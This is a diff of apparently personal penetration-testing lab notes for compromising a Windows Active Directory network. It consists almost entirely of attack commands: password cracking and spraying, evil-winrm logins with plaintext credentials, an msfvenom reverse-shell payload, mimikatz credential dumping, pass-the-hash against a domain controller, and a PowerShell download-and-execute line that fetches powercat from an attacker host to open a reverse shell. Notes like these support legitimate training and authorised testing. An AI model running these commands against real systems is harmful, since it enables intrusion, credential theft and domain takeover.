@@ -26,7 +26,7 @@ df5fb539ff32f7fde5f3c05d8c8c1a6e - acorp
 hashcat -m 0 ecorp.hash /usr/share/wordlists/rockyou.txt
 
 # try password spraying - evilwinrm works
-evil-winrm -i 192.168.220.153 -u support -p "Freedom1"
+evil-winrm -i 192.168.240.153 -u support -p "Freedom1"
 ```
 
 .153 privesc
@@ -49,7 +49,7 @@ upload adduser.exe
 shutdown /r /t 0 
 Get-LocalGroupMember administrators
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f exe -o shell9999.exe
 
 # obtain a has from running admintool.exe
 # note that we needed an interactive shell to see the bug in the tool
@@ -57,8 +57,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f exe
 # password - December31
 hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
-evil-winrm -i 192.168.220.153 -u Administrator -p "December31"
-lsadump::sam sekurlsa::msv lsadump::secrets lsadump::cache
+evil-winrm -i 192.168.240.153 -u Administrator -p "December31"
 
 ```
 
@@ -110,6 +109,8 @@ Invoke-BloodHound -LDAPUser support -LDAPPAss Freedom1 -CollectionMethod All -Ou
 
 enumerate internal network
 ```
+evil-winrm -i 192.168.240.153 -u Administrator -p "December31"
+
 # from kali
 sudo ip tuntap add user kali mode tun ligolo
 sudo ip link set ligolo up
@@ -119,7 +120,7 @@ sudo ip link set ligolo up
 >> start
 
 # add route to internal network
-sudo ip route add 10.10.110.0/24 dev ligolo
+sudo ip route add 10.10.130.0/24 dev ligolo
 
 # from windows target
 upload agent.exe
@@ -134,9 +135,33 @@ sudo nmap -sU --open -p 161 -Pn 10.10.110.154
 
 # local auth allows you to use local accounts rather than domain creds
 crackmapexec smb 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth
-crackmapexec winrm 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth --local-auth
+crackmapexec winrm 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth
 
+# can use either evil-winrm or psexec. winrm has an odd shell that doesn't allow you to run mimikatz normally or bloodhound
 evil-winrm -i 10.10.130.154 -u administrator -p hghgib6vHT3bVWf
+impacket-psexec administrator:hghgib6vHT3bVWf@10.10.130.154
+
+# check out domain info
+upload SharpHound.ps1
+powershell -ep bypass
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All
+# from bloodhound we learn that Administrator and tom_admin are domain admins
+
+# run mimikatz from evil-winrm
+./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit" >> mm.txt
+# from mimikatz we gain the administrator's hash. we cannot crack it so we can just use pass the hash to access the domain controller
+
+hashcat -m 1000 admin2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+# test if your shell isn't taking, that we can even hit kali
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.234/powercat.ps1');powercat -c 192.168.45.234 -p 4444 -e powershell"
+```
+
+.152 (domain controller)
+```
+# use the Administrator's hash to pwn the domain controller easily
+impacket-psexec -hashes :59b280ba707d22e3ef0aa587fc29ffe5 Administrator@10.10.130.152
 ```
 
 .155
